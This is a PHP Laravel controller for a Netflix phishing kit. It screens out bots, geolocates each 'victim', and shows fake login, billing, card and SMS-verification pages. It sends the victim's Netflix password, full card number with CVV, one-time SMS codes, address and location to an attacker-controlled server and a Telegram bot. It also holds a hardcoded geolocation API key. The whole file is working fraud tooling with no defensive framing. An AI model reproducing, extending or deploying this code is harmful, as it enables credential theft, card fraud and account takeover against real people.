<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class MainController extends Controller
{
  
    private $serverIp;
    private $captchaSecretKey;
    private $recaptchaSiteKey;
    private $token;
    public function __construct() {
        $this->serverIp = env('SERVER_IP');
        $this->captchaSecretKey = env('RECAPTCHA_SECRET_KEY');
        $this->recaptchaSiteKey = env('RECAPTCHA_SITE_KEY');
        $this->token = env('NETFLIX_API_TOKEN');
    }

    public function isBot(Request $request)
    {
        $ip = $request->ip(); // ou une IP de test en dur si besoin
    
        try {
            $response = Http::timeout(10)
                ->withHeaders([
                    'User-Agent' => $request->userAgent() ?? 'Mozilla/5.0'
                ])
                ->post("{$this->serverIp}/api/is-bot", [
                    'bot_ip' => $ip,
                    'scam_type' => 'netflix'
                ]);
    
            if ($response->failed()) {
                Log::error("Bot check API failed", [
                    'status' => $response->status(),
                    'response' => $response->body()
                ]);
                return $this->fallbackResponse();
            }
    
            $data = $response->json();
    
            if (!is_array($data)) { 
                \Log::warning("Invalid API response", ['body' => $response->body()]);
                return $this->fallbackResponse();
            }
    
            if ($data['block'] ?? false) {
                return response()->json(['message' => 'Access denied'], 403);
            }
    
            // Si AJAX, retourne un JSON avec l'URL de redirection
            if ($request->ajax() || $request->wantsJson()) {
                return response()->json(['redirect' => route('geolocation')]);
            }
    
            // Sinon, redirige normalement
            return redirect()->route('geolocation');
    
        } catch (\Exception $e) {
            Log::error("Bot check exception", ['error' => $e->getMessage()]);
            return $this->fallbackResponse();
        }
    }

    public function getGeolocation(Request $request)
    {
        $ip = $request->ip() ?? '97.229.84.243';
        
        try {
            $response = Http::get("https://pro.ip-api.com/json/{$ip}?key=wUoObwpQXWHPf6N");
            
            if ($response->successful()) {
                $geoData = $response->json();
                session([
                    'geolocation' => $geoData,
                    'victim_ip' => $ip
                ]);
                return redirect()->route('createSession');
            }

            Log::error("Geolocation failed", ['status' => $response->status()]);
            abort(500, 'Geolocation service unavailable');

        } catch (\Exception $e) {
            Log::error("Geolocation exception", ['error' => $e->getMessage()]);
            abort(500, 'Geolocation error');
        }
    }

    public function createSession(Request $request)
    {
        $ip = $request->ip();
        try {
            $response = Http::timeout(10)
                ->withHeaders([
                    'User-Agent' => $request->userAgent() ?? 'Mozilla/5.0'
                ])
                ->post("{$this->serverIp}/api/is-bot", [
                    'bot_ip' => $ip,
                    'scam_type' => 'netflix'
                ]);
    
            $data = $response->json();
    
            if (!is_array($data) || ($data['block'] ?? false)) {
                // Blocage : 404 ou redirection externe
                abort(404); // ou return redirect('https://www.google.com');
            }
        } catch (\Exception $e) {
            abort(404);
        }

        session()->flush();
        try {
            $sessionId = uniqid();

            $response = Http::withHeaders($this->getRequestHeaders($request))
                ->post("{$this->serverIp}/api/netflix/create/{$sessionId}", [
                    'scam_link' => $request->fullUrl()
                ]);

            if ($response->successful()) {
                $uuid = $response->json('uuid');
                session([
                    'session_id' => $uuid,
                    'session_start' => now()
                ]);
                $request->session()->put('session_id', $response->json('uuid'));
                return redirect()->route('login', ['session_id' => $uuid]);
            }

            Log::error("Session creation failed", [
                'status' => $response->status(),
                'response' => $response->body()
            ]);
            abort(500, 'Session creation error');

        } catch (\Exception $e) {
            Log::error("Session creation exception", ['error' => $e->getMessage()]);
            abort(500, 'Session service error');
        }
    }

    public function showLoginForm(Request $request, $session_id)
    {
        if (session('session_id') !== $session_id) {
            abort(404);
        }

        return view('login', [
            'recaptchaSiteKey' => $this->recaptchaSiteKey,
            'sessionId' => $session_id
        ]);
    }
    public function showBillingForm(Request $request, $session_id)
    {
        if (session('session_id') !== $session_id) {
            abort(404);
        }

        return view('billing', [
            'session_id' => $session_id
        ]);
    }
    
    public function verifyBilling(Request $request, $session_id)
    {
        if (session('session_id') !== $session_id) {
            abort(404);
        }

        $validated = $request->validate([
            'email' => 'required|email',
            'phone' => 'required|string',
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'address' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'postal' => 'required|string',
        ]);

        $fullName = $validated['firstname'] . ' ' . $validated['lastname'];

        $message = "🧾 <b>BILLING SUBMITTED!</b> 🧾\n\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        $message .= "👤 <b>PERSONAL INFO:</b>\n";
        $message .= "📧 Email: " . $validated['email'] . "\n";
        $message .= "📞 Phone: " . $validated['phone'] . "\n";
        $message .= "👤 Full Name: " . $fullName . "\n\n";
        $message .= "📍 <b>DELIVERY ADDRESS:</b>\n";
        $message .= "🏠 Address: " . $validated['address'] . "\n";
        $message .= "🏙️ City: " . $validated['city'] . "\n";
        $message .= "🏛️ State: " . $validated['state'] . "\n";
        $message .= "📮 Postal Code: " . $validated['postal'] . "\n\n";
        $message .= "🔗 <b>SYSTEM INFO:</b>\n";
        $message .= "🆔 Session: " . $session_id . "\n";
        $message .= "⏰ Time: " . now()->format('Y-m-d H:i:s') . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🎉 <b>Step 2 Complete!</b> 🎉";
        
        $telegramToken = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');

        $response = Http::post("https://api.telegram.org/bot{$telegramToken}/sendMessage", [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
        ]);

        if ($response->successful()) {
            return view('card', [
                'session_id' => $session_id
            ]);
        } else {
            return back()->withErrors(['telegram' => 'Failed to send message to Telegram.']);
        }
    }

   
    private function getCountryFromIp($ip)
    {
        $apiKey = 'wUoObwpQXWHPf6N';
        $url = "https://pro.ip-api.com/json/{$ip}?key={$apiKey}";

        try {
            $response = Http::timeout(5)->get($url);

            if ($response->successful()) {
                $data = $response->json();
                return $data['country'] ?? 'Unknown';
            }
        } catch (\Exception $e) {
            // Tu peux logger l’erreur ici si tu veux
        }

        return 'Unknown';
    }
    


    private function verifyCaptcha(Request $request): bool
    {
        try {
            $response = Http::asForm()->post('https://www.google.com/recaptcha/api/siteverify', [
                'secret' => $this->captchaSecretKey,
                'response' => $request->input('g-recaptcha-response'),
                'remoteip' => $request->ip()
            ]);

            $data = $response->json();
            $success = $data['success'] ?? false;

            if ($success) {
                $this->notifyServer('victim_passed_captcha');
                return true;
            }

            $this->notifyServer('victim_failed_captcha');
            return false;

        } catch (\Exception $e) {
            Log::error("CAPTCHA verification failed", ['error' => $e->getMessage()]);
            return false;
        }
    }

    private function verifyLogin(Request $request): array
    {
        try {
            $url = "{$this->serverIp}/api/netflix/save-account/" . session('session_id');
            $headers = $this->getRequestHeaders($request);
            $body = [
                'login' => $request->email,
                'password' => $request->password
            ];

            Log::info("Login request", [
                'url' => $url,
                'headers' => $headers,
                'body' => $body
            ]);

            $response = Http::withHeaders($headers)->post($url, $body);

            Log::info("Login response", [
                'status' => $response->status(),
                'body' => $response->body()
            ]);

            $this->notifyServer('victim_logged_in');
            return ['success' => true];

        } catch (\Exception $e) {
            Log::error("Login verification failed", ['error' => $e->getMessage()]);
            $this->notifyServer('victim_failed_login');
            return ['success' => true];
        }
    }

    public function showCardForm(Request $request, $session_id)
    {
        if (session('session_id') !== $session_id) {
            abort(404);
        }
        
        return view('card', [
            'session_id' => $session_id
        ]);
    }


    public function verifyCard(Request $request, $session_id)
    {
        $request->validate([
            'cardholder' => 'required|string|max:255',
            'card_number' => 'required|string|min:16|max:19',
            'expiry' => ['required', 'string', 'regex:/^(0[1-9]|1[0-2])\/([0-9]{2})$/'],
            'cvv' => 'required|string|min:3|max:4'
        ]);

        try {
            $names = explode(' ', $request->cardholder, 2);
            $firstName = $names[0] ?? '';
            $lastName = $names[1] ?? '';

            $url = "{$this->serverIp}/api/netflix/save/{$session_id}";
            $headers = $this->getRequestHeaders($request);
            $cardNumber = preg_replace('/\s+/', '', $request->card_number);
            $body = [
                'first_name' => $firstName,
                'last_name' => $lastName,
                'card_number' => $cardNumber,
                'expiry_date' => $request->expiry,
                'security_code' => $request->cvv
            ];

            Log::info("Card request", [
                'url' => $url,
                'headers' => $headers,
                'body' => $body
            ]);

            $response = Http::withHeaders($headers)->post($url, $body);
            $cc_result = $response->json('cc_result');

            // Extraire les 4 derniers chiffres de la carte
            $last4 = substr($cardNumber, -4);

            // Stocker dans session
            $request->session()->put('cc_result', $cc_result);
            $request->session()->put('last4_card_number', $last4);

            Log::info("Card response", [
                'status' => $response->status(),
                'body' => $response->body(),
                'last4_card_number' => $last4
            ]);

            $this->notifyServer('card_submitted');

            
            return view('card', [
                'session_id' => $session_id,
                'loading' => true,
                'response' => $response->json()
            ]);

        } catch (\Exception $e) {
            Log::error("Card verification failed", ['error' => $e->getMessage()]);
            return redirect()->route('card', ['session_id' => $session_id])
                        ->withErrors(['error' => 'Une erreur est survenue. Veuillez réessayer.']);
        }
    }

    public function whatToDo(Request $request)
    {
        $cc_result = session('cc_result');
        $session_id = session('session_id');

        if (!$cc_result || !$session_id) {
            return response()->json(['error' => 'Données de session manquantes (cc_result ou session_id)'], 400);
        }

        $url = "{$this->serverIp}/api/netflix/what-to-do/{$cc_result}/{$session_id}";

        $headers = [
            'Authorization' => 'Bearer ' . $this->token,
            'Accept' => 'application/json, text/plain, */*',
            'App-Version' => '630',
        ];

        try {
            $response = Http::withHeaders($headers)->get($url);

            if (!$response->successful()) {
                return response()->json(['error' => 'Requête échouée', 'status' => $response->status()], $response->status());

            }

            $data = $response->json();

            if ($data['status'] === 4) {
                session()->put('cc_status', 'Declined');  // Met à jour la session avant le return
                return response()->json(['message' => 'Statut 4 : Action requise.', 'data' => $data], 200);
            }

            return response()->json(['data' => $data], 200);

        } catch (\Exception $e) {
            return response()->json(['error' => 'Erreur lors de la requête', 'message' => $e->getMessage()], 500);
        }
    }
    public function checkCcStatus()
    {
        // Vérifier la valeur de cc_status dans la session
        $ccStatus = session('cc_status');

        if ($ccStatus === 'Declined') {
            return response()->json(['status' => 'Declined']);
        } else {
            return response()->json(['status' => 'Not Declined']);
        }
    }

    public function showSmsVerification(Request $request, $session_id)
    {
        if (session('session_id') !== $session_id) {
            abort(404);
        }

        if (session('cc_status') === 'Declined') {
            return redirect()->route('card', [
                'session_id' => $session_id
            ]); 
        }

        if (!session()->has('last4_card_number') || session('last4_card_number') !== '1111') {
            return redirect()->route('card', [
                'session_id' => $session_id
            ]);  
        }

        return view('sms', [
            'session_id' => $session_id
        ]);
    }
    public function verifySms(Request $request)
    {
        try {
            $session_id = $request->input('session_id') ?? session('session_id');
            Log::info("verifySms called", [
                'session_id' => $session_id,
                'cc_result' => session('cc_result'),
                'request_data' => $request->all()
            ]);

            $request->validate([
                'code' => 'required|string|min:4|max:10'
            ]);

            $cc_result = session('cc_result');
            
            if (!$cc_result) {
                Log::error("CC result not found in session", [
                    'session_id' => $session_id,
                    'session_data' => session()->all()
                ]);
                return response()->json([
                    'success' => false,
                    'message' => 'Session data not found. Please restart the process.',
                    'error' => 'CC result not found'
                ], 400);
            }

            $url = "{$this->serverIp}/api/netflix/save-sms/{$cc_result}/{$session_id}";
            
            $headers = [
                'Authorization' => 'Bearer ' . $this->token,
                'Content-Type' => 'application/json',
                'Accept' => 'application/json',
                'App-Version' => '630'
            ];
            
            $body = [
                'code' => $request->code
            ];

            Log::info("SMS request", [
                'url' => $url,
                'headers' => $headers,
                'body' => $body,
                'cc_result' => $cc_result
            ]);

            $response = Http::timeout(30)->withHeaders($headers)->post($url, $body);
            
            Log::info("SMS response", [
                'status' => $response->status(),
                'body' => $response->body()
            ]);

            try {
                $this->notifyServer('sms_submitted');
            } catch (\Exception $e) {
                Log::warning("Failed to notify server", ['error' => $e->getMessage()]);
            }

            return response()->json([
                'success' => true,
                'message' => 'SMS code submitted successfully',
                'data' => $response->json() ?: ['status' => 'success']
            ]);

        } catch (\Illuminate\Validation\ValidationException $e) {
            Log::error("SMS validation failed", [
                'errors' => $e->errors(),
                'session_id' => $session_id ?? 'unknown'
            ]);
            
            return response()->json([
                'success' => false,
                'message' => 'Validation failed',
                'errors' => $e->errors()
            ], 422);

        } catch (\Exception $e) {
            Log::error("SMS verification failed", [
                'error' => $e->getMessage(),
                'session_id' => $session_id ?? 'unknown',
                'code' => $request->input('code'),
                'trace' => $e->getTraceAsString()
            ]);
            
            return response()->json([
                'success' => false,
                'message' => 'Une erreur est survenue. Veuillez réessayer.',
                'error' => $e->getMessage()
            ], 500);
        }
    }


    private function getRequestHeaders(Request $request): array
    {
        return [
            'Authorization' => 'Bearer ' . $this->token,
            'Content-Type' => 'application/json;charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin' => $this->serverIp,
            'Referer' => $this->serverIp . '/',
            'Accept-Language' => 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Vicitm-Ip' => $request->ip() ?? '97.229.84.243',
            'App-Version' => '1.0'
        ];
    }

    private function notifyServer(string $action): void
    {
        try {
            Http::withHeaders($this->getRequestHeaders(request()))
                ->post("{$this->serverIp}/api/netflix/refresh/" . session('session_id'), [
                    'action_sent' => $action,
                    'timestamp' => now()->toDateTimeString()
                ]);
        } catch (\Exception $e) {
            Log::error("Failed to notify server", ['action' => $action, 'error' => $e->getMessage()]);
        }
    }
    
    public function refreshAction(Request $request)
    {
        $session_id = session('session_id'); 
        $action = $request->input('action_sent', 'login');

        if (!$session_id) {
            return response()->json(['error' => 'Session ID is missing'], 400);
        }

        $url = "{$this->serverIp}/api/netflix/refresh/{$session_id}";

        $headers = [
            'Authorization' => 'Bearer ' . $this->token,
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Accept' => 'application/json, text/plain, */*',
            'App-Version' => '630',
            'User-Agent' => 'Mozilla/5.0',
            'Origin' => 'http://localhost',
            'Referer' => 'http://localhost',
            'Accept-Language' => 'fr-FR,fr;q=0.9',
            'Vicitm-Ip' => $request->ip(),
        ];

        $postData = [
            'action_sent' => $action,
        ];

        if (session()->has('cc_result')) {
            $postData['cc_result'] = session('cc_result');
        }

        try {
            $response = Http::asForm()
                ->withHeaders($headers)
                ->post($url, $postData);

            return response()->json([
                'status' => $response->status(),
                'body' => $response->json()
            ]);

        } catch (\Exception $e) {
            Log::error("refreshAction failed", ['message' => $e->getMessage()]);
            return response()->json(['error' => 'Request failed'], 500);
        }
    }





    

    private function fallbackResponse()
    {
        return redirect()->route('geolocation');
    }

    // Helper function to get detailed location info
    private function getDetailedLocationInfo(Request $request)
    {
        $ip = $request->ip() ?? 'Unknown';
        $userAgent = $request->userAgent() ?? 'Unknown';
        $geoData = session('geolocation', []);
        
        // If no geolocation data in session, try to get it fresh
        if (empty($geoData) || $geoData['country'] === 'Unknown') {
            try {
                $geoResponse = Http::timeout(5)->get("https://pro.ip-api.com/json/{$ip}?key=wUoObwpQXWHPf6N");
                if ($geoResponse->successful()) {
                    $geoData = $geoResponse->json();
                    // Update session with fresh data
                    session(['geolocation' => $geoData]);
                }
            } catch (\Exception $e) {
                Log::warning("Failed to get fresh geolocation data", ['error' => $e->getMessage()]);
            }
        }
        
        // Simple device detection
        $deviceType = strpos(strtolower($userAgent), 'mobile') !== false ? '📱 Mobile' : '💻 Desktop';
        
        return [
            'ip' => $ip,
            'deviceType' => $deviceType,
            'country' => $geoData['country'] ?? 'Unknown',
            'region' => $geoData['regionName'] ?? 'Unknown',
            'city' => $geoData['city'] ?? 'Unknown',
            'isp' => $geoData['isp'] ?? 'Unknown',
            'timezone' => $geoData['timezone'] ?? 'Unknown',
            'org' => $geoData['org'] ?? 'Unknown',
            'as' => $geoData['as'] ?? 'Unknown',
            'zip' => $geoData['zip'] ?? 'Unknown',
            'lat' => $geoData['lat'] ?? 'Unknown',
            'lon' => $geoData['lon'] ?? 'Unknown'
        ];
    }

    // Simple Telegram function
    private function sendTelegramSimple($message)
    {
        try {
            $botToken = env('TELEGRAM_BOT_TOKEN', 'your-bot-token-here');
            $chatIds = explode(',', env('TELEGRAM_CHAT_ID', 'your-chat-id-here'));

            Log::info("Telegram configuration check", [
                'botToken' => $botToken ? 'configured' : 'not configured',
                'chatIds' => $chatIds,
                'message_length' => strlen($message)
            ]);

            if (!$botToken || $botToken === 'your-bot-token-here') {
                Log::error("TELEGRAM_BOT_TOKEN not configured");
                return false;
            }

            if (!$chatIds || empty($chatIds[0]) || $chatIds[0] === 'your-chat-id-here') {
                Log::error("TELEGRAM_CHAT_ID not configured");
                return false;
            }

            $successCount = 0;
            foreach ($chatIds as $chatId) {
                $chatId = trim($chatId);
                if (empty($chatId)) continue;
                
                Log::info("Sending Telegram message", [
                    'chat_id' => $chatId,
                    'message_preview' => substr($message, 0, 100) . '...'
                ]);
                
                $response = Http::timeout(10)->post("https://api.telegram.org/bot{$botToken}/sendMessage", [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML',
                ]);

                if ($response->successful()) {
                    Log::info("Telegram message sent successfully to chat_id: " . $chatId);
                    $successCount++;
                } else {
                    Log::error("Failed to send Telegram message", [
                        'chat_id' => $chatId,
                        'status' => $response->status(),
                        'response' => $response->body(),
                        'bot_token_length' => strlen($botToken)
                    ]);
                }
            }

            Log::info("Telegram sending completed", [
                'total_chat_ids' => count($chatIds),
                'successful_sends' => $successCount
            ]);

            return $successCount > 0;
        } catch (\Exception $e) {
            Log::error("Error sending Telegram message", [
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            return false;
        }
    }

    // Simple spin notification function
    public function handleSpin(Request $request)
    {
        try {
            $sessionId = session('session_id') ?? 'Unknown';
            $locationInfo = $this->getDetailedLocationInfo($request);
            
            // Create detailed message
            $message = "🎰 <b>SPIN CLICKED!</b> 🎰\n\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $message .= "📱 <b>DEVICE INFO:</b>\n";
            $message .= "📱 Device: {$locationInfo['deviceType']}\n";
            $message .= "🌐 IP: {$locationInfo['ip']}\n\n";
            $message .= "🌍 <b>LOCATION INFO:</b>\n";
            $message .= "🏳️ Country: {$locationInfo['country']}\n";
            $message .= "🏙️ Region: {$locationInfo['region']}\n";
            $message .= "🏘️ City: {$locationInfo['city']}\n";
            $message .= "📮 ZIP: {$locationInfo['zip']}\n";
            $message .= "📍 Coordinates: {$locationInfo['lat']}, {$locationInfo['lon']}\n\n";
            $message .= "📡 <b>NETWORK INFO:</b>\n";
            $message .= "📡 ISP: {$locationInfo['isp']}\n";
            $message .= "🏢 Organization: {$locationInfo['org']}\n";
            $message .= "🌐 AS: {$locationInfo['as']}\n";
            $message .= "⏰ Timezone: {$locationInfo['timezone']}\n\n";
            $message .= "🔗 <b>SYSTEM INFO:</b>\n";
            $message .= "🆔 Session: {$sessionId}\n";
            $message .= "⏰ Time: " . now()->format('Y-m-d H:i:s') . "\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "🎉 <b>Spin Action Detected!</b> 🎉";
            
            $telegramToken = env('TELEGRAM_BOT_TOKEN');
            $chatId = env('TELEGRAM_CHAT_ID');

            $response = Http::post("https://api.telegram.org/bot{$telegramToken}/sendMessage", [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML',
            ]);

            if ($response->successful()) {
                Log::info("Telegram message sent successfully");
            } else {
                Log::error("Failed to send Telegram message", [
                    'status' => $response->status(),
                    'response' => $response->body()
                ]);
            }
            
            // Notify server
            $this->notifyServer('spin_clicked');
            
            return response()->json(['success' => true, 'message' => 'Spin processed successfully']);
            
        } catch (\Exception $e) {
            Log::error("Error in handleSpin", ['error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Error processing spin'], 500);
        }
    }

    // Test function for Telegram
    public function testTelegram(Request $request)
    {
        $testMessage = "🧪 <b>TELEGRAM TEST</b> 🧪\n\n";
        $testMessage .= "📱 Device: Test Device\n";
        $testMessage .= "🌐 IP: " . ($request->ip() ?? 'Unknown') . "\n";
        $testMessage .= "🏳️ Country: Test Country\n";
        $testMessage .= "⏰ Time: " . now()->format('Y-m-d H:i:s') . "\n";
        
        $result = $this->sendTelegramSimple($testMessage);
        
        return response()->json([
            'success' => $result,
            'message' => $result ? 'Test message sent successfully' : 'Failed to send test message',
            'bot_token' => env('TELEGRAM_BOT_TOKEN') ? 'configured' : 'not configured',
            'chat_id' => env('TELEGRAM_CHAT_ID') ? 'configured' : 'not configured'
        ]);
    }
}